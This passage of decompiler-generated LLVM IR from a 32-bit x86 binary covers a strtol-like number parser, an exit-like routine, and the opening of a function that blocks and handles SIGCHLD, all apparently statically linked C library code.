  br i1 %v1_8053c4517, label %dec_label_pc_8053c3d, label %dec_label_pc_8053c47

dec_label_pc_8053c3d:                             ; preds = %dec_label_pc_8053c24, %dec_label_pc_8053c3d
  %v0_8053c3d = phi i32 [ %v1_8053c3d, %dec_label_pc_8053c3d ], [ %v4_8053c31, %dec_label_pc_8053c24 ]
  %v1_8053c3d = add i32 %v0_8053c3d, 1
  store i32 %v1_8053c3d, i32* %ebx.global-to-local, align 4
  %v1_8053c3e = inttoptr i32 %v1_8053c3d to i8*
  %v2_8053c3e = load i8, i8* %v1_8053c3e, align 1
  %v3_8053c3e = sext i8 %v2_8053c3e to i32
  store i32 %v3_8053c3e, i32* %eax.global-to-local, align 4
  %v2_8053c41 = mul nsw i32 %v3_8053c3e, 2
  %v3_8053c41 = add i32 %v2_8053c41, %v0_8053c2b
  %v4_8053c41 = inttoptr i32 %v3_8053c41 to i8*
  %v5_8053c41 = load i8, i8* %v4_8053c41, align 1
  %v6_8053c41 = and i8 %v5_8053c41, 32
  %v7_8053c41 = icmp eq i8 %v6_8053c41, 0
  %v1_8053c45 = icmp eq i1 %v7_8053c41, false
  br i1 %v1_8053c45, label %dec_label_pc_8053c3d, label %dec_label_pc_8053c47

dec_label_pc_8053c47:                             ; preds = %dec_label_pc_8053c3d, %dec_label_pc_8053c24
  %v0_8053c5c = phi i32 [ %v4_8053c31, %dec_label_pc_8053c24 ], [ %v1_8053c3d, %dec_label_pc_8053c3d ]
  %v4_8053c75 = phi i32 [ %v3_8053c3e9, %dec_label_pc_8053c24 ], [ %v3_8053c3e, %dec_label_pc_8053c3d ]
  %v9_8053c47 = icmp eq i32 %v4_8053c75, 43
  br i1 %v9_8053c47, label %dec_label_pc_8053c5c, label %dec_label_pc_8053c4c

dec_label_pc_8053c4c:                             ; preds = %dec_label_pc_8053c47
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8053c4e = icmp eq i32 %v4_8053c75, 45
  %v1_8053c51 = icmp eq i1 %v9_8053c4e, false
  br i1 %v1_8053c51, label %dec_label_pc_8053c5d, label %dec_label_pc_8053c5c

dec_label_pc_8053c5c:                             ; preds = %dec_label_pc_8053c47, %dec_label_pc_8053c4c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8053c4c ], [ 0, %dec_label_pc_8053c47 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8053c5c = add i32 %v0_8053c5c, 1
  store i32 %v1_8053c5c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c5d

dec_label_pc_8053c5d:                             ; preds = %dec_label_pc_8053c4c, %dec_label_pc_8053c5c
  %v0_8053c6f = phi i32 [ %v0_8053c5c, %dec_label_pc_8053c4c ], [ %v1_8053c5c, %dec_label_pc_8053c5c ]
  %v1_8053c5f = and i32 %arg3, -17
  %v2_8053c5f = icmp eq i32 %v1_8053c5f, 0
  %v1_8053c65 = icmp eq i1 %v2_8053c5f, false
  br i1 %v1_8053c65, label %dec_label_pc_8053c8b, label %dec_label_pc_8053c67

dec_label_pc_8053c67:                             ; preds = %dec_label_pc_8053c5d
  %v1_8053c67 = add i32 %arg3, 10
  store i32 %v1_8053c67, i32* %esi.global-to-local, align 4
  %v1_8053c6a = inttoptr i32 %v0_8053c6f to i8*
  %v2_8053c6a = load i8, i8* %v1_8053c6a, align 1
  %v8_8053c6a = icmp eq i8 %v2_8053c6a, 48
  %v1_8053c6d = icmp eq i1 %v8_8053c6a, false
  br i1 %v1_8053c6d, label %dec_label_pc_8053c81, label %dec_label_pc_8053c6f

dec_label_pc_8053c6f:                             ; preds = %dec_label_pc_8053c67
  %v1_8053c6f = add i32 %v0_8053c6f, 1
  store i32 %v1_8053c6f, i32* %ebx.global-to-local, align 4
  %v1_8053c70 = add i32 %arg3, 8
  store i32 %v1_8053c70, i32* %esi.global-to-local, align 4
  %v1_8053c75 = inttoptr i32 %v1_8053c6f to i8*
  %v2_8053c75 = load i8, i8* %v1_8053c75, align 1
  %v3_8053c75 = zext i8 %v2_8053c75 to i32
  %v5_8053c75 = and i32 %v4_8053c75, -256
  %v6_8053c75 = or i32 %v5_8053c75, %v3_8053c75
  %v1_8053c77 = or i32 %v6_8053c75, 32
  %v3_8053c77 = trunc i32 %v1_8053c77 to i8
  store i32 %v1_8053c77, i32* %eax.global-to-local, align 4
  %v10_8053c7a = icmp eq i8 %v3_8053c77, 120
  %v1_8053c7c = icmp eq i1 %v10_8053c7a, false
  br i1 %v1_8053c7c, label %dec_label_pc_8053c81, label %dec_label_pc_8053c7e

dec_label_pc_8053c7e:                             ; preds = %dec_label_pc_8053c6f
  %v2_8053c7e = mul i32 %v1_8053c70, 2
  store i32 %v2_8053c7e, i32* %esi.global-to-local, align 4
  %v1_8053c80 = add i32 %v0_8053c6f, 2
  store i32 %v1_8053c80, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c81

dec_label_pc_8053c81:                             ; preds = %dec_label_pc_8053c6f, %dec_label_pc_8053c67, %dec_label_pc_8053c7e
  %v0_8053caa26 = phi i32 [ %v1_8053c6f, %dec_label_pc_8053c6f ], [ %v0_8053c6f, %dec_label_pc_8053c67 ], [ %v1_8053c80, %dec_label_pc_8053c7e ]
  %v0_8053d0134 = phi i32 [ %v1_8053c6f, %dec_label_pc_8053c6f ], [ %v4_8053c31, %dec_label_pc_8053c67 ], [ %v1_8053c6f, %dec_label_pc_8053c7e ]
  %v0_8053c81 = phi i32 [ %v1_8053c70, %dec_label_pc_8053c6f ], [ %v1_8053c67, %dec_label_pc_8053c67 ], [ %v2_8053c7e, %dec_label_pc_8053c7e ]
  %v7_8053c84 = icmp sgt i32 %v0_8053c81, 16
  br i1 %v7_8053c84, label %dec_label_pc_8053c8b.thread, label %dec_label_pc_8053c8b

dec_label_pc_8053c8b.thread:                      ; preds = %dec_label_pc_8053c81
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c95

dec_label_pc_8053c8b:                             ; preds = %dec_label_pc_8053c81, %dec_label_pc_8053c5d
  %v0_8053d0135 = phi i32 [ %v0_8053d0134, %dec_label_pc_8053c81 ], [ %v4_8053c31, %dec_label_pc_8053c5d ]
  %v0_8053caa27 = phi i32 [ %v0_8053caa26, %dec_label_pc_8053c81 ], [ %v0_8053c6f, %dec_label_pc_8053c5d ]
  %v0_8053c9a = phi i32 [ %v0_8053c81, %dec_label_pc_8053c81 ], [ %arg3, %dec_label_pc_8053c5d ]
  %v1_8053c8b = add i32 %v0_8053c9a, -2
  store i32 %v1_8053c8b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8053c93 = icmp ugt i32 %v1_8053c8b, 34
  br i1 %v6_8053c93, label %dec_label_pc_8053cf6, label %dec_label_pc_8053c95

dec_label_pc_8053c95:                             ; preds = %dec_label_pc_8053c8b.thread, %dec_label_pc_8053c8b
  %v0_8053c9a59 = phi i32 [ 16, %dec_label_pc_8053c8b.thread ], [ %v0_8053c9a, %dec_label_pc_8053c8b ]
  %v0_8053caa2758 = phi i32 [ %v0_8053caa26, %dec_label_pc_8053c8b.thread ], [ %v0_8053caa27, %dec_label_pc_8053c8b ]
  %v0_8053d013557 = phi i32 [ %v0_8053d0134, %dec_label_pc_8053c8b.thread ], [ %v0_8053d0135, %dec_label_pc_8053c8b ]
  %div = udiv i32 -1, %v0_8053c9a59
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp52 = urem i32 -1, %v0_8053c9a59
  %v1_8053c9c = trunc i32 %tmp52 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8053cd6 = urem i32 %arg4, 256
  br label %dec_label_pc_8053caa

dec_label_pc_8053ca8:                             ; preds = %dec_label_pc_8053cec, %dec_label_pc_8053cd6
  %v4_8053caa.pre = phi i32 [ %v1_8053cc0, %dec_label_pc_8053cec ], [ %v4_8053caa.pre.pre, %dec_label_pc_8053cd6 ]
  %v0_8053ca8 = phi i32 [ %v1_8053cc7, %dec_label_pc_8053cec ], [ %v0_8053ca8.pre, %dec_label_pc_8053cd6 ]
  br label %dec_label_pc_8053caa

dec_label_pc_8053caa:                             ; preds = %dec_label_pc_8053c95, %dec_label_pc_8053ca8
  %v0_8053d0133 = phi i32 [ %v0_8053d013557, %dec_label_pc_8053c95 ], [ %v0_8053ca8, %dec_label_pc_8053ca8 ]
  %v0_8053cc7 = phi i32 [ %v0_8053caa2758, %dec_label_pc_8053c95 ], [ %v0_8053ca8, %dec_label_pc_8053ca8 ]
  %v4_8053caa = phi i32 [ %div, %dec_label_pc_8053c95 ], [ %v4_8053caa.pre, %dec_label_pc_8053ca8 ]
  %v1_8053caa = inttoptr i32 %v0_8053cc7 to i8*
  %v2_8053caa = load i8, i8* %v1_8053caa, align 1
  %v3_8053caa = zext i8 %v2_8053caa to i32
  %v5_8053caa = and i32 %v4_8053caa, -256
  %v6_8053caa = or i32 %v3_8053caa, %v5_8053caa
  store i32 %v6_8053caa, i32* %eax.global-to-local, align 4
  %v1_8053cac = add i32 %v6_8053caa, -48
  %v1_8053caf = trunc i32 %v1_8053cac to i8
  %tmp60 = icmp ult i8 %v1_8053caf, 10
  br i1 %tmp60, label %dec_label_pc_8053cc0, label %dec_label_pc_8053cb4

dec_label_pc_8053cb4:                             ; preds = %dec_label_pc_8053caa
  %v1_8053cb4 = or i32 %v6_8053caa, 32
  %v3_8053cb4 = trunc i32 %v1_8053cb4 to i8
  store i32 %v1_8053cb4, i32* %eax.global-to-local, align 4
  %v1_8053cb7 = and i32 %v1_8053cac, -256
  %v2_8053cb7 = or i32 %v1_8053cb7, 40
  %tmp61 = icmp ult i8 %v3_8053cb4, 97
  br i1 %tmp61, label %dec_label_pc_8053cc0, label %dec_label_pc_8053cbd

dec_label_pc_8053cbd:                             ; preds = %dec_label_pc_8053cb4
  %v1_8053cbd = add i32 %v1_8053cb4, -87
  br label %dec_label_pc_8053cc0

dec_label_pc_8053cc0:                             ; preds = %dec_label_pc_8053cb4, %dec_label_pc_8053caa, %dec_label_pc_8053cbd
  %v0_8053cef = phi i32 [ %v2_8053cb7, %dec_label_pc_8053cb4 ], [ %v1_8053cac, %dec_label_pc_8053caa ], [ %v1_8053cbd, %dec_label_pc_8053cbd ]
  %v1_8053cc0 = urem i32 %v0_8053cef, 256
  store i32 %v1_8053cc0, i32* %eax.global-to-local, align 4
  %v1_8053cc3 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053cc3 = sub i32 %v1_8053cc0, %v1_8053cc3
  %v10_8053cc3 = and i32 %v2_8053cc3, %v1_8053cc3
  %v11_8053cc3 = icmp slt i32 %v10_8053cc3, 0
  %v13_8053cc3 = icmp slt i32 %v2_8053cc3, 0
  %v2_8053cc5 = icmp eq i1 %v13_8053cc3, %v11_8053cc3
  br i1 %v2_8053cc5, label %dec_label_pc_8053cf6, label %dec_label_pc_8053cc7

dec_label_pc_8053cc7:                             ; preds = %dec_label_pc_8053cc0
  %v1_8053cc7 = add i32 %v0_8053cc7, 1
  store i32 %v1_8053cc7, i32* %ebx.global-to-local, align 4
  %v0_8053cc8 = load i32, i32* %edx.global-to-local, align 4
  %tmp62 = icmp ugt i32 %v0_8053cc8, %div
  br i1 %tmp62, label %dec_label_pc_8053cd6, label %dec_label_pc_8053cce

dec_label_pc_8053cce:                             ; preds = %dec_label_pc_8053cc7
  %v15_8053cc8 = icmp eq i32 %v0_8053cc8, %div
  %v1_8053cce = icmp eq i1 %v15_8053cc8, false
  br i1 %v1_8053cce, label %dec_label_pc_8053cec, label %dec_label_pc_8053cd0

dec_label_pc_8053cd0:                             ; preds = %dec_label_pc_8053cce
  %v1_8053cd0 = trunc i32 %v0_8053cef to i8
  %tmp63 = icmp ugt i8 %v1_8053cd0, %v1_8053c9c
  br i1 %tmp63, label %dec_label_pc_8053cd6, label %dec_label_pc_8053cec

dec_label_pc_8053cd6:                             ; preds = %dec_label_pc_8053cd0, %dec_label_pc_8053cc7
  store i32 %v4_8053cd6, i32* %eax.global-to-local, align 4
  %v0_8053cda = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053cda = and i32 %v0_8053cda, %v4_8053cd6
  store i32 %v2_8053cda, i32* %ebp.global-to-local, align 4
  %v1_8053cdc = call i32 @function_8052729(i32 %div)
  store i32 %v1_8053cdc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8053ce4 = inttoptr i32 %v1_8053cdc to i32*
  store i32 34, i32* %v1_8053ce4, align 4
  %v0_8053ca8.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053caa.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ca8

dec_label_pc_8053cec:                             ; preds = %dec_label_pc_8053cd0, %dec_label_pc_8053cce
  %v4_8053cec = mul i32 %v0_8053cc8, %v1_8053cc3
  store i32 %v1_8053cc0, i32* %eax.global-to-local, align 4
  %v2_8053cf2 = add i32 %v4_8053cec, %v1_8053cc0
  store i32 %v2_8053cf2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ca8

dec_label_pc_8053cf6:                             ; preds = %dec_label_pc_8053cc0, %dec_label_pc_8053c8b
  %v0_8053d01 = phi i32 [ %v0_8053d0135, %dec_label_pc_8053c8b ], [ %v0_8053d0133, %dec_label_pc_8053cc0 ]
  %stack_var_-24.0 = phi i32 [ %tmp42, %dec_label_pc_8053c8b ], [ %div, %dec_label_pc_8053cc0 ]
  %v4_8053cf6 = icmp eq i32 %arg2, 0
  br i1 %v4_8053cf6, label %dec_label_pc_8053d03, label %dec_label_pc_8053cfd

dec_label_pc_8053cfd:                             ; preds = %dec_label_pc_8053cf6
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053d01 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053d01, i32* %v2_8053d01, align 4
  br label %dec_label_pc_8053d03

dec_label_pc_8053d03:                             ; preds = %dec_label_pc_8053cf6, %dec_label_pc_8053cfd
  %v0_8053d03 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8053d03, i32* %eax.global-to-local, align 4
  %v1_8053d05 = trunc i32 %v0_8053d03 to i8
  %v6_8053d05 = icmp eq i8 %v1_8053d05, 0
  %v2_8053d07 = zext i1 %v6_8053d05 to i32
  %v1_8053d094 = or i32 %v2_8053d07, -2147483648
  store i32 %v1_8053d094, i32* %ebx.global-to-local, align 4
  %v5_8053d0f = icmp eq i8 %tmp, 0
  br i1 %v5_8053d0f, label %dec_label_pc_8053d27, label %dec_label_pc_8053d16

dec_label_pc_8053d16:                             ; preds = %dec_label_pc_8053d03
  %v0_8053d16 = load i32, i32* %edx.global-to-local, align 4
  %tmp64 = icmp ugt i32 %v0_8053d16, %v1_8053d094
  br i1 %tmp64, label %dec_label_pc_8053d1a, label %dec_label_pc_8053d27

dec_label_pc_8053d1a:                             ; preds = %dec_label_pc_8053d16
  %v1_8053d1a = call i32 @function_8052729(i32 %stack_var_-24.0)
  store i32 %v1_8053d1a, i32* %eax.global-to-local, align 4
  %v0_8053d1f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053d1f, i32* %edx.global-to-local, align 4
  %v1_8053d21 = inttoptr i32 %v1_8053d1a to i32*
  store i32 34, i32* %v1_8053d21, align 4
  %v0_8053d27.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053d27

dec_label_pc_8053d27:                             ; preds = %dec_label_pc_8053d16, %dec_label_pc_8053d03, %dec_label_pc_8053d1a
  %v0_8053d27 = phi i32 [ %v0_8053d03, %dec_label_pc_8053d16 ], [ %v0_8053d03, %dec_label_pc_8053d03 ], [ %v0_8053d27.pre, %dec_label_pc_8053d1a ]
  store i32 %v0_8053d27, i32* %eax.global-to-local, align 4
  %v3_8053d29 = trunc i32 %v0_8053d27 to i8
  %v4_8053d29 = icmp eq i8 %v3_8053d29, 0
  %v0_8053d32.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_8053d29, label %dec_label_pc_8053d2f, label %dec_label_pc_8053d2d

dec_label_pc_8053d2d:                             ; preds = %dec_label_pc_8053d27
  %v1_8053d2d = sub i32 0, %v0_8053d32.pre
  store i32 %v1_8053d2d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053d2f

dec_label_pc_8053d2f:                             ; preds = %dec_label_pc_8053d27, %dec_label_pc_8053d2d
  %v0_8053d32 = phi i32 [ %v1_8053d2d, %dec_label_pc_8053d2d ], [ %v0_8053d32.pre, %dec_label_pc_8053d27 ]
  store i32 %v0_8053d32, i32* %eax.global-to-local, align 4
  %v2_8053d34 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053d34, i32* @ebx, align 4
  ret i32 %v0_8053d32

; uselistorder directives
  uselistorder i32 %v0_8053d32, { 1, 0 }
  uselistorder i32 %v0_8053d27, { 1, 0 }
  uselistorder i32 %v0_8053cc8, { 0, 2, 1 }
  uselistorder i32 %v1_8053cc7, { 1, 0 }
  uselistorder i32 %v2_8053cc3, { 1, 0 }
  uselistorder i32 %v1_8053cc0, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053cef, { 1, 0 }
  uselistorder i32 %v0_8053ca8, { 1, 0 }
  uselistorder i32 %v4_8053cd6, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_8053c9a59, { 1, 0 }
  uselistorder i32 %v0_8053d0135, { 1, 0 }
  uselistorder i32 %v2_8053c7e, { 1, 0 }
  uselistorder i32 %v1_8053c77, { 1, 0 }
  uselistorder i32 %v1_8053c70, { 1, 0, 2 }
  uselistorder i32 %v0_8053c6f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_8053c75, { 2, 0, 1 }
  uselistorder i32 %v1_8053c3d, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053c31, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 7, 1, 6, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 16, 14, 15, 17 }
  uselistorder i8 10, { 0, 1, 2, 3, 6, 5, 4, 7, 12, 9, 10, 13, 11, 8 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 17, 16, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 13, 14, 15, 0, 10 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d2f, { 1, 0 }
  uselistorder label %dec_label_pc_8053d27, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053d03, { 1, 0 }
  uselistorder label %dec_label_pc_8053cc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053caa, { 1, 0 }
  uselistorder label %dec_label_pc_8053c95, { 1, 0 }
  uselistorder label %dec_label_pc_8053c81, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053c5d, { 1, 0 }
  uselistorder label %dec_label_pc_8053c5c, { 1, 0 }
  uselistorder label %dec_label_pc_8053c3d, { 1, 0 }
}

define i32 @function_8053d39(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053d39:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053d4c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053d4c, i32* @ebx, align 4
  %v2_8053d51 = call i32 @function_80540b0(i32 %v2_8053d4c, i32 134561965)
  %v1_8053d5d = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056850.230 to i32))
  %v0_8053d62 = load i32, i32* @global_var_8056938.231, align 8
  store i32 %v0_8053d62, i32* @eax, align 4
  %v1_8053d6a = icmp eq i32 %v0_8053d62, 0
  br i1 %v1_8053d6a, label %dec_label_pc_8053d77, label %dec_label_pc_8053d6e

dec_label_pc_8053d6e:                             ; preds = %dec_label_pc_8053d39
  %v0_8053d71 = load i32, i32* @esi, align 4
  %v1_8053d72 = call i32 @unknown_0(i32 %v0_8053d71)
  store i32 %v1_8053d72, i32* @eax, align 4
  br label %dec_label_pc_8053d77

dec_label_pc_8053d77:                             ; preds = %dec_label_pc_8053d39, %dec_label_pc_8053d6e
  %v2_8053d7c = call i32 @function_80540b0(i32 %v2_8053d4c, i32 1)
  %v0_8053d81 = call i32 @function_805406e()
  %v0_8053d9a = load i32, i32* @esi, align 4
  %v1_8053d9b = call i32 @function_8054450(i32 %v0_8053d9a)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8054450, { 1, 0 }
  uselistorder i32 (i32)* @function_80540ad, { 7, 6, 5, 4, 3, 10, 0, 1, 9, 8, 2 }
  uselistorder i32 (i32, i32)* @function_80540b0, { 8, 7, 6, 5, 13, 12, 4, 0, 3, 1, 11, 10, 9, 2 }
  uselistorder label %dec_label_pc_8053d77, { 1, 0 }
}

define i32 @function_8053da0(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053da0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053da0 = load i32, i32* @ebp, align 4
  %v0_8053da1 = load i32, i32* @edi, align 4
  %v0_8053da2 = load i32, i32* @esi, align 4
  %v0_8053da3 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8053db6 = icmp eq i32 %arg1, 0
  %v1_8053db8 = icmp eq i1 %v1_8053db6, false
  br i1 %v1_8053db8, label %dec_label_pc_8053dbf.lr.ph, label %dec_label_pc_8053f17

dec_label_pc_8053dbf.lr.ph:                       ; preds = %dec_label_pc_8053da0
  %v15_8053da4 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053dbf56 = add i32 %v15_8053da4, 416
  %v5_8053dbf57 = inttoptr i32 %v4_8053dbf56 to i32*
  store i32 0, i32* %v5_8053dbf57, align 4
  %v0_8053dca58 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053dca59 = add i32 %v0_8053dca58, -1
  %v9_8053dca60 = icmp slt i32 %v1_8053dca59, 0
  store i32 %v1_8053dca59, i32* %eax.global-to-local, align 4
  %v1_8053dcb61 = icmp eq i1 %v9_8053dca60, false
  br i1 %v1_8053dcb61, label %dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge, label %dec_label_pc_8053dcd

dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge: ; preds = %dec_label_pc_8053dbf.lr.ph, %dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge
  %v1_8053dca62 = phi i32 [ %v1_8053dca, %dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge ], [ %v1_8053dca59, %dec_label_pc_8053dbf.lr.ph ]
  %v0_8053dbf.pre = load i32, i32* @esp, align 4
  %v2_8053dbf = mul i32 %v1_8053dca62, 4
  %v3_8053dbf = add i32 %v0_8053dbf.pre, 292
  %v4_8053dbf = add i32 %v3_8053dbf, %v2_8053dbf
  %v5_8053dbf = inttoptr i32 %v4_8053dbf to i32*
  store i32 0, i32* %v5_8053dbf, align 4
  %v0_8053dca = load i32, i32* %eax.global-to-local, align 4
  %v1_8053dca = add i32 %v0_8053dca, -1
  %v9_8053dca = icmp slt i32 %v1_8053dca, 0
  store i32 %v1_8053dca, i32* %eax.global-to-local, align 4
  %v1_8053dcb = icmp eq i1 %v9_8053dca, false
  br i1 %v1_8053dcb, label %dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge, label %dec_label_pc_8053dcd

dec_label_pc_8053dcd:                             ; preds = %dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge, %dec_label_pc_8053dbf.lr.ph
  %v1_8053dca.lcssa = phi i32 [ %v1_8053dca59, %dec_label_pc_8053dbf.lr.ph ], [ %v1_8053dca, %dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053de3 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053de3, i32* @ebx, align 4
  store i32 %v2_8053de3, i32* %stack_var_-460, align 4
  %v4_8053deb = call i32 @function_8052b3e(i32 %v2_8053de3, i32 17, i32 %v1_8053dca.lcssa, i32 %v1_8053dca.lcssa)
  store i32 %v4_8053deb, i32* %eax.global-to-local, align 4
  %v2_8053df3 = icmp slt i32 %v4_8053deb, 0
  br i1 %v2_8053df3, label %dec_label_pc_8053f1b, label %dec_label_pc_8053dfb

dec_label_pc_8053dfb:                             ; preds = %dec_label_pc_8053dcd
  %v2_8053dfc = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053dfc, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053e07 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053e07 = call i32 @function_805245d(i32 0, %_TYPEDEF_sigset_t* %v3_8053e07, i32 %v2_8053dfc)
  store i32 %v4_8053e07, i32* %eax.global-to-local, align 4
  %v1_8053e0f = icmp eq i32 %v4_8053e07, 0
  %v1_8053e11 = icmp eq i1 %v1_8053e0f, false
  br i1 %v1_8053e11, label %dec_label_pc_8053f1b, label %dec_label_pc_8053e17

dec_label_pc_8053e17:                             ; preds = %dec_label_pc_8053dfb
  store i32 %v2_8053dfc, i32* %stack_var_-460, align 4
  %v4_8053e1c = call i32 @function_8052b1a(i32 %v2_8053dfc, i32 17, i32 %v4_8053e07, i32 %v4_8053e07)
  store i32 %v4_8053e1c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8053e29 = icmp eq i32 %v4_8053e1c, 0
  br i1 %v1_8053e29, label %dec_label_pc_8053e32.lr.ph, label %dec_label_pc_8053ee5

dec_label_pc_8053e32.lr.ph:                       ; preds = %dec_label_pc_8053e17
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_8053dbf57, align 4
  %v0_8053e3d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053e3d51 = add i32 %v0_8053e3d50, -1
  %v9_8053e3d52 = icmp slt i32 %v1_8053e3d51, 0
  store i32 %v1_8053e3d51, i32* %edx.global-to-local, align 4
  %v1_8053e3e53 = icmp eq i1 %v9_8053e3d52, false
  br i1 %v1_8053e3e53, label %dec_label_pc_8053e32.dec_label_pc_8053e32_crit_edge, label %dec_label_pc_8053e40

dec_label_pc_8053e32.dec_label_pc_8053e32_crit_edge: ; preds = %dec_label_pc_8053e32.lr.ph, %dec_label_pc_8053e32.dec_label_pc_8053e32_crit_edge
  %v1_8053e3d54 = phi i32 [ %v1_8053e3d, %dec_label_pc_8053e32.dec_label_pc_8053e32_crit_edge ], [ %v1_8053e3d51, %dec_label_pc_8053e32.lr.ph ]
  %v0_8053e32.pre = load i32, i32* @esp, align 4
  %v2_8053e32 = mul i32 %v1_8053e3d54, 4
  %v3_8053e32 = add i32 %v0_8053e32.pre, 292
  %v4_8053e32 = add i32 %v3_8053e32, %v2_8053e32
  %v5_8053e32 = inttoptr i32 %v4_8053e32 to i32*
  store i32 0, i32* %v5_8053e32, align 4
  %v0_8053e3d = load i32, i32* %edx.global-to-local, align 4
  %v1_8053e3d = add i32 %v0_8053e3d, -1
  %v9_8053e3d = icmp slt i32 %v1_8053e3d, 0
  store i32 %v1_8053e3d, i32* %edx.global-to-local, align 4
  %v1_8053e3e = icmp eq i1 %v9_8053e3d, false
  br i1 %v1_8053e3e, label %dec_label_pc_8053e32.dec_label_pc_8053e32_crit_edge, label %dec_label_pc_8053e40

dec_label_pc_8053e40:                             ; preds = %dec_label_pc_8053e32.dec_label_pc_8053e32_crit_edge, %dec_label_pc_8053e32.lr.ph
  store i32 %v2_8053de3, i32* %eax.global-to-local, align 4
  store i32 %v2_8053de3, i32* %stack_var_-460, align 4
  %v4_8053e4c = call i32 @function_8052b3e(i32 %v2_8053de3, i32 17, i32 0, i32 0)
  store i32 %v4_8053e4c, i32* %eax.global-to-local, align 4
  %v2_8053e54 = icmp slt i32 %v4_8053e4c, 0
  br i1 %v2_8053e54, label %dec_label_pc_8053f1b, label %dec_label_pc_8053e5c

dec_label_pc_8053e5c:                             ; preds = %dec_label_pc_8053e40
  %v2_8053e5d = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053e5d, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053e66 = call i32 @function_80542ef(i32 17, i32* null, i32 %v2_8053e5d)
  store i32 %v4_8053e66, i32* %eax.global-to-local, align 4
  %v2_8053e6e = icmp slt i32 %v4_8053e66, 0
  %v1_8053e70 = icmp eq i1 %v2_8053e6e, false
  br i1 %v1_8053e70, label %dec_label_pc_8053e9a, label %dec_label_pc_8053e72

dec_label_pc_8053e72:                             ; preds = %dec_label_pc_8053e5c
  %v0_8053e72 = load i32, i32* %stack_var_-460, align 4
  %v1_8053e72 = call i32 @function_8052729(i32 %v0_8053e72)
  store i32 %v1_8053e72, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e72, i32* @ebx, align 4
